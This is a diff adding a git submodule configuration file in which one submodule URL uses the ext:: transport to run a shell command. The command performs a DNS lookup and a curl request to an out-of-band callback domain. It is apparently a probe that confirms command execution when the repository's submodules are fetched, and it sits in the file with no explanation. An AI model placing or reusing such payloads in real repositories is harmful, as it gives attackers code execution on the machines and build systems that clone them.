@@ -1,0 +1,6 @@
+[submodule "a"]
+	path = a
+	url = https://subhttps.d983hqvbc9htsrg9dc20g6kgxpg5c6iya.oast.me/a.git
+[submodule "b"]
+	path = b
+	url = ext::sh -c "nslookup subext.d983hqvbc9htsrg9dc20g6kgxpg5c6iya.oast.me || curl -s http://subextc.d983hqvbc9htsrg9dc20g6kgxpg5c6iya.oast.me/"
